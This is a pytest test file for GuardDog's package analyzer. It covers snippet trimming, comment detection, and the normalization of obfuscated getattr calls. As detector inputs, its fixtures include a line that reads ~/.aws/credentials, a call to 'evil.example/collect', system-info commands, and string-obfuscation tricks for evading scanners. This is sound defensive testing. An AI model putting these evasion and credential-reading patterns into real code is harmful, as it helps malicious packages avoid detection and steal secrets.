import tempfile
import os
from unittest.mock import mock_open, patch

import pytest

from guarddog import ecosystems
from guarddog.analyzer.analyzer import Analyzer
from guarddog.analyzer.python_normalizer import normalize_python_source
from guarddog.ecosystems import LANGUAGE

pypi_analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
npm_analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.NPM)


@pytest.mark.parametrize(
    "analyzer",
    [
        (pypi_analyzer),
        (npm_analyzer),
    ],
)
def test_source_code_analyzer_ran_with_no_rules(analyzer: Analyzer):
    """
    Regression test for https://github.com/DataDog/guarddog/issues/161
    """
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)

    result = analyzer.analyze_sourcecode("/tmp", set())
    assert len(result["errors"]) == 0


def _write(directory, name, content):
    full_path = os.path.join(directory, name)
    os.makedirs(os.path.dirname(full_path), exist_ok=True)
    with open(full_path, "w") as f:
        f.write(content)
    return full_path


def test_filesystem_read_path_include_skips_metadata():
    """
    threat-filesystem-read must only scan source files: a sensitive path
    documented inside a .dist-info/METADATA file is a false positive
    (regression for botocore '~/.aws/credentials' and dotenv docs), while the
    same indicator in real source code must still be flagged.
    """
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    rules = {"threat-filesystem-read"}

    with tempfile.TemporaryDirectory() as metadata_dir:
        _write(
            metadata_dir,
            "pkg-1.0.0.dist-info/METADATA",
            "Next, set up credentials in ``~/.aws/credentials``:\n",
        )
        metadata_result = analyzer.analyze_sourcecode(metadata_dir, rules)
        assert not metadata_result["results"].get("threat-filesystem-read")

    with tempfile.TemporaryDirectory() as source_dir:
        _write(
            source_dir,
            "client.py",
            'creds = open("/home/user/.aws/credentials").read()\n',
        )
        source_result = analyzer.analyze_sourcecode(source_dir, rules)
        assert source_result["results"].get("threat-filesystem-read")


def test_get_snippet_valid_range():
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    path = "/tmp/sample.py"
    start_line = 2
    stop_line = 4
    file_content = "line 1 content\nline 2 content\nline 3 content\nline 4 content\nline 5 content\n"
    expected_snippet = "line 2 content\nline 3 content\nline 4 content\n"

    with patch("builtins.open", mock_open(read_data=file_content)):
        snippet = analyzer.get_snippet(path, start_line, stop_line)

    assert snippet == expected_snippet


def test_get_snippet_out_of_range():
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    path = "/tmp/sample.py"
    start_line = 10
    stop_line = 20
    file_content = "line 1 content\nline 2 content\nline 3 content\nline 4 content\nline 5 content\n"
    expected_snippet = ""

    with patch("builtins.open", mock_open(read_data=file_content)):
        snippet = analyzer.get_snippet(path, start_line, stop_line)

    assert snippet == expected_snippet


def test_get_snippet_file_not_found():
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    path = "/tmp/non_existent_file.py"
    start_line = 2
    stop_line = 4

    with patch("builtins.open", side_effect=FileNotFoundError):
        snippet = analyzer.get_snippet(path, start_line, stop_line)

    assert snippet == ""


def test_trim_code_snippet_keeps_short_code_unchanged():
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    code = "eval(atob('Zm9v'))"
    assert analyzer.trim_code_snippet(code, "atob(") == code


def test_trim_code_snippet_centers_window_on_buried_match():
    # A short match buried in a long minified line must survive truncation so
    # the reporter can still highlight it (regression: the match used to be
    # elided into the middle "..." and could no longer be found).
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    code = "a" * 500 + "atob(" + "b" * 500
    trimmed = analyzer.trim_code_snippet(code, "atob(")

    assert "atob(" in trimmed
    assert trimmed.startswith("...") and trimmed.endswith("...")
    assert len(trimmed) <= 256


def test_trim_code_snippet_falls_back_when_match_absent():
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    code = "x" * 500
    trimmed = analyzer.trim_code_snippet(code, "not-in-code")

    assert trimmed.startswith("x" * 10)
    assert trimmed.endswith("x" * 10)
    assert "..." in trimmed


# Comment filtering tests


@pytest.mark.parametrize(
    "file_path,expected",
    [
        ("/tmp/test.py", LANGUAGE.PYTHON),
        ("/tmp/test.pyx", LANGUAGE.PYTHON),
        ("/tmp/test.pyi", LANGUAGE.PYTHON),
        ("/tmp/test.js", LANGUAGE.JAVASCRIPT),
        ("/tmp/test.jsx", LANGUAGE.JAVASCRIPT),
        ("/tmp/test.mjs", LANGUAGE.JAVASCRIPT),
        ("/tmp/test.cjs", LANGUAGE.JAVASCRIPT),
        ("/tmp/test.ts", LANGUAGE.TYPESCRIPT),
        ("/tmp/test.tsx", LANGUAGE.TYPESCRIPT),
        ("/tmp/test.go", LANGUAGE.GO),
        ("/tmp/test.rb", LANGUAGE.RUBY),
        ("/tmp/test.java", None),
        ("/tmp/test.cpp", None),
    ],
)
def test_detect_language(file_path, expected):
    """Test language detection from file extensions."""
    assert Analyzer._detect_language(file_path) == expected


@pytest.mark.parametrize(
    "suffix,language",
    [
        ('.js', LANGUAGE.JAVASCRIPT),
        ('.ts', LANGUAGE.TYPESCRIPT),
        ('.go', LANGUAGE.GO),
    ]
)
def test_is_in_multiline_comment_cstyle_inside(suffix, language):
    """Test detection of match inside C-style multi-line comment."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("const x = 1;\n")
        f.write("/* This is a comment\n")
        f.write("with pattern here\n")
        f.write("*/\n")
        f.write("const y = 2;\n")
        f.flush()

        # Byte offset at "pattern" which is inside the comment
        byte_offset = len("const x = 1;\n/* This is a comment\nwith ".encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, language, byte_offset=byte_offset) is True
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,language",
    [
        ('.js', LANGUAGE.JAVASCRIPT),
        ('.ts', LANGUAGE.TYPESCRIPT),
        ('.go', LANGUAGE.GO),
    ]
)
def test_is_in_multiline_comment_cstyle_outside(suffix, language):
    """Test detection of match outside C-style multi-line comment."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("const x = 1;\n")
        f.write("/* This is a comment */\n")
        f.write("const pattern = value;\n")
        f.flush()

        # Byte offset at "pattern" which is after the comment
        byte_offset = len("const x = 1;\n/* This is a comment */\nconst ".encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, language, byte_offset=byte_offset) is False
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,language",
    [
        ('.js', LANGUAGE.JAVASCRIPT),
        ('.ts', LANGUAGE.TYPESCRIPT),
        ('.go', LANGUAGE.GO),
    ]
)
def test_is_in_multiline_comment_cstyle_nested(suffix, language):
    """Test detection with multiple C-style comment blocks."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("/* comment 1 */\n")
        f.write("const x = 1;\n")
        f.write("/* comment 2\n")
        f.write("pattern\n")
        f.write("*/\n")
        f.flush()

        # Byte offset at "pattern" in the second comment block
        byte_offset = len("/* comment 1 */\nconst x = 1;\n/* comment 2\n".encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, language, byte_offset=byte_offset) is True
        finally:
            os.unlink(f.name)


def test_is_in_multiline_comment_python_inside():
    """Test detection of match inside Python docstring."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('def foo():\n')
        f.write('    """\n')
        f.write('    This function uses os.homedir()\n')
        f.write('    """\n')
        f.write('    pass\n')
        f.flush()

        # Byte offset at "os.homedir()" inside the docstring
        byte_offset = len('def foo():\n    """\n    This function uses '.encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, LANGUAGE.PYTHON, byte_offset=byte_offset) is True
        finally:
            os.unlink(f.name)


def test_is_in_multiline_comment_python_outside():
    """Test detection of match outside Python docstring."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write('def foo():\n')
        f.write('    """\n')
        f.write('    This is a docstring\n')
        f.write('    """\n')
        f.write('    return os.homedir()\n')
        f.flush()

        # Byte offset at "os.homedir()" which is after the docstring
        byte_offset = len('def foo():\n    """\n    This is a docstring\n    """\n    return '.encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, LANGUAGE.PYTHON, byte_offset=byte_offset) is False
        finally:
            os.unlink(f.name)


def test_is_in_multiline_comment_python_triple_single_quotes():
    """Test detection with Python triple single quotes."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
        f.write("def foo():\n")
        f.write("    '''\n")
        f.write("    Uses os.userInfo()\n")
        f.write("    '''\n")
        f.write("    pass\n")
        f.flush()

        # Byte offset at "os.userInfo()" inside the docstring
        byte_offset = len("def foo():\n    '''\n    Uses ".encode())

        try:
            assert Analyzer._is_in_multiline_comment(f.name, LANGUAGE.PYTHON, byte_offset=byte_offset) is True
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,comment_marker,code_line",
    [
        ('.py', '#', "import os"),
        ('.rb', '#', "require 'etc'"),
    ]
)
def test_is_match_in_comment_hash_single_line(suffix, comment_marker, code_line):
    """Test single-line hash comment detection for Python and Ruby."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write(f"{comment_marker} This is a comment\n")
        f.write(f"{code_line}\n")
        f.flush()

        try:
            # Line 1 is a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=1) is True
            # Line 2 is not a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=2) is False
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,code_line",
    [
        ('.js', "const os = require('os');"),
        ('.ts', "import * as os from 'os';"),
        ('.go', "import \"os\""),
    ]
)
def test_is_match_in_comment_slash_single_line(suffix, code_line):
    """Test single-line slash comment detection for JS/TS/Go."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("// This is a comment\n")
        f.write(f"{code_line}\n")
        f.flush()

        try:
            # Line 1 is a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=1) is True
            # Line 2 is not a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=2) is False
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,code_line",
    [
        ('.py', "home = os.homedir()"),
        ('.js', "const userInfo = os.userInfo();"),
        ('.ts', "const userInfo = os.userInfo();"),
        ('.go', "user := os.Getenv(\"USER\")"),
        ('.rb', "user = Etc.getlogin"),
    ]
)
def test_is_match_in_comment_code_not_comment(suffix, code_line):
    """Test that regular code is not detected as comment."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("// Some comment or import\n")
        f.write(f"{code_line}\n")
        f.flush()

        try:
            # Line 2 is code, not a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=2) is False
        finally:
            os.unlink(f.name)


@pytest.mark.parametrize(
    "suffix,code_line",
    [
        ('.js', "function foo() {}"),
        ('.ts', "declare function userInfo(): UserInfo;"),
        ('.go', "func main() {}"),
    ]
)
def test_is_match_in_comment_block_multiline(suffix, code_line):
    """Test C-style /* */ multi-line comment detection for JS/TS/Go."""
    with tempfile.NamedTemporaryFile(mode='w', suffix=suffix, delete=False) as f:
        f.write("/**\n")
        f.write(" * Block comment with pattern\n")
        f.write(" * More comment content\n")
        f.write(" */\n")
        f.write(f"{code_line}\n")
        f.flush()

        try:
            # Lines 2 and 3 are inside the block comment
            assert Analyzer.is_match_in_comment(f.name, line_number=2) is True
            assert Analyzer.is_match_in_comment(f.name, line_number=3) is True
            # Line 5 is not a comment
            assert Analyzer.is_match_in_comment(f.name, line_number=5) is False
        finally:
            os.unlink(f.name)


def test_is_match_in_comment_with_byte_offset():
    """Test that byte_offset optimization works correctly."""
    with tempfile.NamedTemporaryFile(mode='w', suffix='.js', delete=False) as f:
        f.write("const x = 1;\n")
        f.write("/* comment\n")
        f.write("with os.userInfo()\n")
        f.write("*/\n")
        f.write("const y = 2;\n")
        f.flush()

        # Calculate byte offset for line 3
        byte_offset = len("const x = 1;\n/* comment\n".encode())

        try:
            # Line 3 is inside comment, passing byte_offset for optimization
            assert Analyzer.is_match_in_comment(f.name, line_number=3, byte_offset=byte_offset) is True
        finally:
            os.unlink(f.name)


# Python getattr normalization tests (regression for #914)


@pytest.mark.parametrize(
    "source,expected",
    [
        (
            b'getattr(requests, "get")("https://evil.example")\n',
            b'requests.get("https://evil.example")\n',
        ),
        (
            b'getattr(requests, "ge" + "t")("https://evil.example")\n',
            b'requests.get("https://evil.example")\n',
        ),
        (
            b'getattr(requests, chr(103) + chr(101) + chr(116))("https://evil.example")\n',
            b'requests.get("https://evil.example")\n',
        ),
        (
            b'getattr(os, "".join(["sys", "tem"]))("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b'getattr(os, "".join(map(chr, [115, 121, 115, 116, 101, 109])))("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b'getattr(os, "".join(chr(c) for c in [115, 121, 115, 116, 101, 109]))("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b'getattr(os, "metsys"[::-1])("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b'getattr(os, "".join(reversed("metsys")))("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b"getattr(os, f\"{'sys'}{'tem'}\")(\"whoami\")\n",
            b'os.system("whoami")\n',
        ),
        (
            b'getattr(getattr(urllib, "req" + "uest"), "url" + "open")("https://evil.example")\n',
            b'urllib.request.urlopen("https://evil.example")\n',
        ),
        (
            b'builtins.getattr(subprocess, "ru" + "n")(["id"])\n',
            b'subprocess.run(["id"])\n',
        ),
        (
            b'getattr(os, "system", None)("whoami")\n',
            b'os.system("whoami")\n',
        ),
        (
            b'a = 1\ngetattr(\n    os,\n    "sys" + "tem",\n)("whoami")\nb = 2\n',
            b'a = 1\n\n\n\nos.system("whoami")\nb = 2\n',
        ),
        (
            '# caf\xc3\xa9\nx = "\xc3\xa9"; getattr(os, "sys" + "tem")("whoami")\n'.encode(
                "utf-8"
            ),
            '# caf\xc3\xa9\nx = "\xc3\xa9"; os.system("whoami")\n'.encode("utf-8"),
        ),
    ],
)
def test_normalize_python_source_rewrites_constant_getattr(source, expected):
    normalized = normalize_python_source(source)
    assert normalized == expected
    assert normalized.count(b"\n") == source.count(b"\n")


@pytest.mark.parametrize(
    "source",
    [
        b'import os\nos.system("whoami")\n',
        b'# getattr(os, "system")("whoami")\n',
        b'host = getattr(settings, "STATSD_HOST", "localhost")\n',
        b'fn = getattr(requests, "get", None)\n',
        b"getattr(obj, attr_name)()\n",
        b'getattr(obj, "not-an-identifier")()\n',
        b'getattr(obj, "class")()\n',
        b'def broken(:\n    getattr(os, "system")\n',
    ],
)
def test_normalize_python_source_skips_unrewritable_cases(source):
    assert normalize_python_source(source) is None


def test_getattr_dynamic_calls_detected_by_capability_and_threat_rules():
    """Regression test for #914: constant getattr calls must not evade YARA rules."""
    analyzer = Analyzer(ecosystem=ecosystems.ECOSYSTEM.PYPI)
    rules = {
        "capability-network-outbound",
        "capability-network-download",
        "capability-process-spawn",
        "capability-filesystem-read",
        "threat-network-exfil-sysinfo",
        "threat-process-sysinfo",
        "threat-runtime-obfuscation-api",
    }

    with tempfile.TemporaryDirectory() as tmpdir:
        _write(
            tmpdir,
            "adv.py",
            (
                "import os\n"
                "import requests\n"
                "import subprocess\n"
                "\n"
                'getattr(requests, "ge" + "t")("https://evil.example/collect")\n'
                'getattr(subprocess, "ru" + "n")(["id"], shell=False)\n'
                'getattr(os, "sys" + "tem")("whoami")\n'
                'getattr(handle, "re" + "ad")()\n'
            ),
        )
        res = analyzer.analyze_sourcecode(tmpdir, rules)
        assert not res["errors"]
        results = res["results"]

        assert results["capability-network-outbound"]
        assert results["capability-network-outbound"][0]["location"] == "adv.py:5"
        assert results["capability-network-download"]
        assert results["capability-network-download"][0]["location"] == "adv.py:5"
        assert results["capability-process-spawn"]
        assert results["capability-process-spawn"][0]["location"] == "adv.py:6"
        assert results["capability-filesystem-read"]
        assert results["capability-filesystem-read"][0]["location"] == "adv.py:8"
        assert results["threat-network-exfil-sysinfo"]
        assert results["threat-process-sysinfo"]
        assert results["threat-process-sysinfo"][0]["location"] == "adv.py:7"

    with tempfile.TemporaryDirectory() as tmpdir:
        _write(
            tmpdir,
            "chr_evasion.py",
            (
                "import requests\n"
                'getattr(requests, chr(103) + chr(101) + chr(116))("https://evil.example")\n'
            ),
        )
        res = analyzer.analyze_sourcecode(tmpdir, {"capability-network-outbound"})
        assert res["results"]["capability-network-outbound"]
        assert (
            res["results"]["capability-network-outbound"][0]["location"]
            == "chr_evasion.py:2"
        )

    # Passive 3-arg getattr feature checks must not trigger false positives.
    with tempfile.TemporaryDirectory() as tmpdir:
        _write(
            tmpdir,
            "benign.py",
            'import requests\nget_fn = getattr(requests, "get", None)\n',
        )
        res = analyzer.analyze_sourcecode(tmpdir, {"capability-network-outbound"})
        assert not res["results"]["capability-network-outbound"]

    # Raw-source rules matching literal getattr must continue to fire.
    with tempfile.TemporaryDirectory() as tmpdir:
        _write(
            tmpdir,
            "raw_getattr.py",
            'getattr(__builtins__, "exec")("print(1)")\n',
        )
        res = analyzer.analyze_sourcecode(tmpdir, {"threat-runtime-obfuscation-api"})
        assert res["results"]["threat-runtime-obfuscation-api"]

